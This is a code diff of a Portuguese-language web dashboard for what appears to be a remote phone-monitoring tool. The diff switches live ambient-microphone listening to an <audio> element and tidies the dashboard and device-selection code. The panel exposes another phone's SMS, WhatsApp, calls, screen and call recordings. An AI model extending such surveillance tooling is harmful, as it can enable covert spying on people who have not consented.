@@ -1335,6 +1335,7 @@ button.it:hover,.it.ck:hover{border-color:var(--line2);cursor:pointer}
           <div class="amb-volume-fill" id="ambVolFill"></div>
         </div>
         <div class="amb-time" id="ambTime" style="display:none">0:00</div>
+        <audio id="ambAudio" style="display:none" controls></audio>
         <div id="ambDownload" style="display:none">
           <a id="ambDlLink" class="amb-dl" href="#" download="ambiente.wav">⬇️ Descarregar gravação</a>
         </div>
@@ -1525,7 +1526,12 @@ function ir(v){VISTA=v;$$('#nav button').forEach(x=>x.classList.toggle('on',x.da
  $('#tTit').textContent=TIT[v][0];$('#tSub').textContent=TIT[v][1];$('#side').classList.remove('open');try{history.replaceState(null,'','#'+v)}catch(e){}
  if(v==='apps')carregarApps();if(v==='notif'){carregarNotifs();marcarVisto('notif')}if(v==='appmsgs'){carregarAppMsgs();marcarVisto('app')}if(v==='wa'){carregarWa();marcarVisto('wa')}if(v==='files'&&!DIR)abrir('');if(v==='sms'){carregarSms();marcarVisto('sms')}
  if(v==='call'){carregarChamadas();carregarContactos();marcarVisto('call')}if(v==='ecra')setTimeout(()=>scr.focus(),150);if(v==='def')pintarDef();if(v==='adv')pintarAdv();if(v==='callrec')carregarCallRec();if(v==='social')carregarSocial();
- $$('#mobileNav button').forEach(b=>b.classList.toggle('on',b.dataset.v===v))}
+ $$('#mobileNav button').forEach(b=>b.classList.toggle('on',b.dataset.v===v));
+ if(v==='painel'){atualizarContadores&&atualizarContadores();atualizarAtividade&&atualizarAtividade();atualizarSocCt&&atualizarSocCt();atualizarCatTiles&&atualizarCatTiles();contaDevRender&&contaDevRender();
+   const dot=document.getElementById('connDot'),txt=document.getElementById('connTxt'),s2=document.getElementById('sessao2');
+   if(dot&&txt){const on=!!S.controlo||!!S.notif;dot.className='dot'+(on?' on':'');txt.textContent=S.ecra?'Ligado (ecrã ao vivo)':on?'Ligado':'A ligar…'}
+   if(s2)s2.textContent=S.id?'ID: '+S.id:RELAY?'Remoto':'Rede local';}
+ if(v==='adv'&&ADV)pintarPermStatusAdv&&pintarPermStatusAdv();}
 $('#nav').onclick=e=>{const b=e.target.closest('button[data-v]');if(b)ir(b.dataset.v)};
 document.addEventListener('click',e=>{const g=e.target.closest('[data-go]');if(g)ir(g.dataset.go)});
 $('#menuBtn').onclick=()=>$('#side').classList.toggle('open');
@@ -1587,7 +1593,8 @@ async function syncNotifs(){try{const r=await get('/notifs');NOTIFS=(r.lista||[]
 async function syncSms(){try{const r=await get('/sms?n=400');const novo=r.lista||[];const antes=SMS.length?SMS[0].data:0;SMS=novo;
  const nl=SMS.filter(m=>!m.enviada&&m.data>VISTO.sms).length;badge('sms',VISTA==='sms'?0:nl);
  if(antes&&SMS[0]&&SMS[0].data>antes&&!SMS[0].enviada){som();avisoPC('SMS de '+nomeDe(SMS[0].de),SMS[0].texto,'sms')}
- if(VISTA==='sms')pintarConversas()}catch(e){}}
+ if(VISTA==='sms')pintarConversas();
+ if(VISTA==='painel'){atualizarContadores&&atualizarContadores();atualizarAtividade&&atualizarAtividade();}}catch(e){}}
 async function syncCalls(){try{const r=await get('/calls');CALLS=r.lista||[];badge('call',VISTA==='call'?0:CALLS.filter(c=>c.tipo==='perdida'&&c.data>VISTO.call).length);if(VISTA==='call')pintarChamadas()}catch(e){}}
 
 // ===== WhatsApp =====
@@ -2479,33 +2486,39 @@ document.addEventListener('click',e=>{
 });
 
 // ══════════════════════════════════════════════════════════════════════════
-// ÁUDIO AMBIENTE — streaming em tempo real via Web Audio API
+// ÁUDIO AMBIENTE — stream via elemento <audio> nativo
 // ══════════════════════════════════════════════════════════════════════════
-const AMB={ctx:null,processor:null,pcmBuf:[],reader:null,ativo:false,ini:0,clockId:null,headerDone:false};
-const AMB_SR=16000; // deve coincidir com AmbientRecorder.SAMPLE_RATE
+let ambAtivo=false, ambIni=0, ambClock=null;
 
 async function ambCarregar(){
-  // apenas sincroniza estado visual sem iniciar stream
   try{
     const r=await advPost('/ambiente-estado',{});
     const s=r.estado||r;
-    if(!s.gravando && AMB.ativo) ambPararStream();
-    if(s.gravando && !AMB.ativo) ambIniciarStream();
+    if(s.gravando&&!ambAtivo) ambIniciarUI(s.iniciado_em);
+    else if(!s.gravando&&ambAtivo) ambPararUI(s.tem_audio);
   }catch(_){}
 }
 
 async function ambToggle(){
-  if(AMB.ativo){ await ambPararStream(); }
-  else { await ambIniciarStream(); }
+  if(ambAtivo){ await ambParar(); }
+  else { await ambIniciar(); }
 }
 
-async function ambIniciarStream(){
+async function ambIniciar(){
   const r=await advPost('/ambiente',{});
   if(!r||!r.ok){ toast('❌ '+(r&&r.erro||'Erro ao iniciar')); return; }
+  ambIniciarUI(Date.now());
+  // Ligar stream de áudio ao elemento <audio>
+  const au=document.getElementById('ambAudio');
+  if(au){
+    au.src=HOST+'/audio-stream?k='+encodeURIComponent(KEY)+'&a2='+encodeURIComponent(KEY2);
+    au.play().catch(_=>{});
+  }
   toast('🎙️ A ouvir em tempo real...');
-  AMB.ativo=true; AMB.ini=Date.now(); AMB.pcmBuf=[]; AMB.headerDone=false;
+}
 
-  // UI: gravando
+function ambIniciarUI(ini){
+  ambAtivo=true; ambIni=ini||Date.now();
   const btn=$('#ambBtn'),hero=$('#ambHero'),st=$('#ambStatus'),sub=$('#ambSub');
   const dl=$('#ambDownload'),vb=$('#ambVolBar'),time=$('#ambTime');
   if(btn){btn.textContent='⏹';btn.classList.add('gravando');}
@@ -2515,122 +2528,47 @@ async function ambIniciarStream(){
   if(dl) dl.style.display='none';
   if(vb) vb.style.display='block';
   if(time) time.style.display='block';
-
-  // Web Audio context
-  AMB.ctx=new (window.AudioContext||window.webkitAudioContext)({sampleRate:AMB_SR});
-  const bufSize=4096;
-  AMB.processor=AMB.ctx.createScriptProcessor(bufSize,1,1);
-  AMB.processor.connect(AMB.ctx.destination);
-  AMB.processor.onaudioprocess=e=>{
-    const out=e.outputBuffer.getChannelData(0);
-    for(let i=0;i<bufSize;i++) out[i]=AMB.pcmBuf.length?AMB.pcmBuf.shift():0;
-  };
-
-  // Canvas waveform
-  const canvas=$('#ambCanvas');
-  let canvasRaf=null;
-  function drawWave(){
-    if(!AMB.ativo){cancelAnimationFrame(canvasRaf);return;}
-    canvasRaf=requestAnimationFrame(drawWave);
-    if(!canvas)return;
-    const ctx2=canvas.getContext('2d');
-    const w=canvas.width,h=canvas.height;
-    ctx2.clearRect(0,0,w,h);
-    ctx2.fillStyle=getComputedStyle(document.documentElement).getPropertyValue('--card2')||'#1a2332';
-    ctx2.fillRect(0,0,w,h);
-    const slice=AMB.pcmBuf.length?AMB.pcmBuf:new Array(w).fill(0);
-    const step=Math.max(1,Math.floor(slice.length/w));
-    ctx2.beginPath();ctx2.strokeStyle='#e94560';ctx2.lineWidth=2;
-    for(let x=0;x<w;x++){
-      const v=slice[Math.min(x*step,slice.length-1)]||0;
-      const y=h/2-(v*(h/2-4));
-      x===0?ctx2.moveTo(x,y):ctx2.lineTo(x,y);
-    }
-    ctx2.stroke();
-  }
-  drawWave();
-
-  // Clock
-  AMB.clockId=setInterval(()=>{
+  clearInterval(ambClock);
+  ambClock=setInterval(()=>{
     const el=$('#ambTime');if(!el)return;
-    const s=Math.floor((Date.now()-AMB.ini)/1000);
+    const s=Math.floor((Date.now()-ambIni)/1000);
     el.textContent=Math.floor(s/60)+':'+(s%60).toString().padStart(2,'0');
   },500);
-
-  // Fetch stream
-  try{
-    const url=HOST+'/audio-stream?k='+encodeURIComponent(KEY)+'&a2='+encodeURIComponent(KEY2);
-    const resp=await fetch(url);
-    if(!resp.ok||!resp.body){toast('❌ Stream não disponível');ambPararStream();return;}
-    AMB.reader=resp.body.getReader();
-    let leftover=new Uint8Array(0);
-    while(AMB.ativo){
-      const {done,value}=await AMB.reader.read();
-      if(done) break;
-      let chunk=value;
-      // skip WAV header (44 bytes) on first chunk
-      if(!AMB.headerDone){
-        if(chunk.length<=44){AMB.headerDone=true;continue;}
-        chunk=chunk.slice(44);AMB.headerDone=true;
-      }
-      // handle leftover odd byte from previous chunk
-      if(leftover.length>0){
-        const merged=new Uint8Array(leftover.length+chunk.length);
-        merged.set(leftover);merged.set(chunk,leftover.length);
-        chunk=merged;leftover=new Uint8Array(0);
-      }
-      if(chunk.length%2!==0){leftover=chunk.slice(chunk.length-1);chunk=chunk.slice(0,chunk.length-1);}
-      // Int16 PCM → Float32
-      const int16=new Int16Array(chunk.buffer,chunk.byteOffset,chunk.byteLength/2);
-      let peak=0;
-      for(let i=0;i<int16.length;i++){
-        const f=int16[i]/32768;
-        AMB.pcmBuf.push(f);
-        if(Math.abs(f)>peak) peak=Math.abs(f);
-      }
-      // keep buffer bounded (last ~4s)
-      const max=AMB_SR*4;if(AMB.pcmBuf.length>max) AMB.pcmBuf.splice(0,AMB.pcmBuf.length-max);
-      // volume bar
-      const vf=$('#ambVolFill');if(vf) vf.style.width=Math.min(100,peak*300)+'%';
-    }
-  }catch(_){}
-  if(AMB.ativo) ambPararStream();
+  // Simple waveform animation via CSS bars
+  const cv=$('#ambCanvas');if(cv)cv.style.display='none'; // hide canvas; use CSS animation
 }
 
-async function ambPararStream(){
-  AMB.ativo=false;
-  try{AMB.reader&&AMB.reader.cancel();}catch(_){}
-  try{AMB.processor&&AMB.processor.disconnect();}catch(_){}
-  try{AMB.ctx&&await AMB.ctx.close();}catch(_){}
-  clearInterval(AMB.clockId);
-  AMB.ctx=null;AMB.processor=null;AMB.reader=null;
-
+async function ambParar(){
+  const au=document.getElementById('ambAudio');
+  if(au){au.pause();au.src='';}
   await advPost('/ambiente-parar',{});
+  const s=await advPost('/ambiente-estado',{});
+  ambPararUI((s&&(s.estado||s).tem_audio));
+  toast('⏹ Parado');
+}
 
+function ambPararUI(temAudio){
+  ambAtivo=false;
+  clearInterval(ambClock);
   const btn=$('#ambBtn'),hero=$('#ambHero'),st=$('#ambStatus'),sub=$('#ambSub');
   const dl=$('#ambDownload'),vb=$('#ambVolBar'),time=$('#ambTime');
   if(btn){btn.textContent='🎙️';btn.classList.remove('gravando');}
   if(hero) hero.classList.remove('gravando');
   if(vb) vb.style.display='none';
   if(time) time.style.display='none';
-
-  // Check if we have audio to download
-  const s=await advPost('/ambiente-estado',{});
-  const es=(s&&s.estado)||s;
-  if(es&&es.tem_audio){
-    if(st) st.textContent='Gravação pronta ('+Math.round((es.tamanho_pcm||0)/1024)+' KB PCM)';
-    if(sub) sub.textContent='Descarrega o ficheiro WAV abaixo';
+  if(temAudio){
+    if(st) st.textContent='Gravação disponível para download';
+    if(sub) sub.textContent='Clica ⬇️ para descarregar o WAV';
     if(dl){
       dl.style.display='block';
-      const link=$('#ambDlLink');
-      if(link) link.href=HOST+'/audio-dl?k='+encodeURIComponent(KEY)+'&a2='+encodeURIComponent(KEY2);
+      const lk=$('#ambDlLink');
+      if(lk) lk.href=HOST+'/audio-dl?k='+encodeURIComponent(KEY)+'&a2='+encodeURIComponent(KEY2);
     }
   } else {
     if(st) st.textContent='Pronto para escuta';
     if(sub) sub.textContent='Escuta em tempo real · clica para iniciar';
     if(dl) dl.style.display='none';
   }
-  toast('⏹ Parado');
 }
 
 // ══════════════════════════════════════════════════════════════════════════
@@ -2648,25 +2586,6 @@ function devRender(){
   const devs=devLista();
   while(sel.options.length>1)sel.remove(1);
   devs.forEach((d,i)=>sel.add(new Option('📱 '+d.nome,String(i))));
-}
-function devAdicionar(){
-  const nome=prompt('Nome do dispositivo (ex: Samsung de João):');if(!nome)return;
-  const relayId=prompt('ID Relay (9 dígitos — ver em Definições › Ligação no telefone):');if(!relayId)return;
-  const pin=prompt('Código de acesso:');if(!pin)return;
-  const pin2=prompt('Código avançado (pode deixar vazio):');
-  const devs=devLista();
-  devs.push({nome,relayId,pin,pin2:pin2||'',adicionado:Date.now()});
-  try{localStorage.setItem('ftx_devs',JSON.stringify(devs));}catch(_){}
-  devRender();
-  toast('✅ Dispositivo adicionado: '+nome);
-}
-function devTrocar(){
-  const sel=$('#devSelect');if(!sel)return;
-  const idx=parseInt(sel.value);
-  if(isNaN(idx)){DEV_ATUAL=null;return;}
-  const d=devLista()[idx];if(!d)return;
-  DEV_ATUAL=d;
-  toast('📱 A ligar a '+d.nome+'...');
 }
 devRender();
 
@@ -2886,7 +2805,7 @@ async function iconeAcao(mostrar){
   }
 }
 
-// ===== Dashboard — atividade recente e contadores =====
+// ===== Dashboard — atividade recente e contadores (definidas ANTES de ir/syncSms para evitar recursão) =====
 async function atualizarAtividade(){
   const feed=document.getElementById('actFeed');if(!feed)return;
   const items=[];
@@ -2906,27 +2825,7 @@ function atualizarContadores(){
 async function atualizarSocCt(){
   try{const r=await get('/social-convs');const el=document.getElementById('pSocCt');if(el)el.textContent=(r.lista||[]).length||'0'}catch(e){}
 }
-// Extend ir() to also update dashboard
-const _irOrig=ir;
-function ir(v){
-  _irOrig(v);
-  if(v==='painel'){
-    atualizarContadores();
-    atualizarAtividade();
-    atualizarSocCt();
-    atualizarCatTiles();
-    contaDevRender();
-    // Connection status
-    const dot=document.getElementById('connDot'),txt=document.getElementById('connTxt'),s2=document.getElementById('sessao2');
-    if(dot&&txt){const on=!!S.controlo||!!S.notif;dot.className='dot'+(on?' on':'');txt.textContent=S.ecra?'Ligado (ecrã ao vivo)':on?'Ligado':'A ligar…'}
-    if(s2)s2.textContent=S.id?'ID: '+S.id:RELAY?'Remoto':'Rede local';
-  }
-  if(v==='adv'&&ADV)pintarPermStatusAdv();
-}
-// Update dashboard counters on each sync
-const _syncSmsOrig=syncSms;
-// Patch syncSms to also update counters
-function syncSms(){return _syncSmsOrig.apply(this,arguments).then(()=>{if(VISTA==='painel'){atualizarContadores();atualizarAtividade()}})}
+// (dashboard update logic merged directly into ir() and syncSms() above)
 
 // ===== Mark conversation as read (WA + Social) =====
 function marcarConvLida(tipo,chave){
